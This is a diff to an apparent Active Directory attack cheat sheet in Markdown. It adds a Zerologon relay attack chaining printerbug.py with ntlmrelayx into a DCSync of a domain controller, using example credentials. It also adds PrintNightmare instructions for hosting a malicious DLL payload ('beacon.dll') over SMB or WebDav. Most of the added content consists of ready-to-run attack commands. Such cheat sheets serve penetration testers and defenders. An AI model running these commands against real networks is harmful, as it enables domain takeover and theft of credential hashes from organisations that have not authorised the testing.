@@ -522,6 +522,27 @@ Exploit steps from the white paper
   crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
   ```
 
+A 2nd approach to exploit zerologon is done by relaying authentication.
+
+This technique, [found by dirkjanm](https://dirkjanm.io/a-different-way-of-abusing-zerologon), requires more prerequisites but has the advantage of having no impact on service continuity.
+The following prerequisites are needed:
+* A domain account
+* One DC running the `PrintSpooler` service
+* Another DC vulnerable to zerologon
+
+`ntlmrelayx` - from Impacket and any tool such as [`printerbug.py`](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
+
+```powershell
+# Check if one DC is running the PrintSpooler service
+rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv"
+
+# Setup ntlmrelay in one shell
+ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support
+
+#Trigger printerbug in 2nd shell
+python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
+```
+
 #### PrintNightmare
 
 > CVE-2021-1675 / CVE-2021-34527
@@ -552,6 +573,24 @@ Requirements:
   ```
 
 **Trigger the exploit**: 
+**Payload Hosting**: 
+* The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109):
+```ps1
+python3 ./smbserver.py share /tmp/smb/
+```
+* Using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) (Admin rights required on host): 
+```ps1
+Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
+```
+* Using WebDav with [SharpWebServer](https://github.com/mgeeky/SharpWebServer) (Doesn't require admin rights):
+```ps1
+SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
+```
+When using WebDav instead of SMB, you must add `@[PORT]` to the hostname in the URI, e.g.: `\\172.16.1.5@8888\Downloads\beacon.dll`
+WebDav client **must** be activated on exploited target. By default it is not activated on Windows workstations (you have to `net start webclient`) and it's not installed on servers. Here is how to detect activated webdav:
+```ps1
+cme smb -u user -p password -d domain.local -M webdav [TARGET]
+```
 
 **NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109): `python3 ./smbserver.py share /tmp/smb/` or using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) : `Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable`
 
@@ -2607,7 +2646,11 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
     sc \\dc01 stop dns
     sc \\dc01 start dns
     ```
-
+### [Active Directory Groups](#active-directory-groups)
+* [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
+* [Abusing DNS Admins Group](#abusing-dns-admins-group)
+* [Abusing Schema Admins Group](#abusing-schema-admins-group)
+* [Abusing Backup Operators Group](#abusing-backup-operators-group)
 
 ### Abusing Active Directory ACLs/ACEs
 
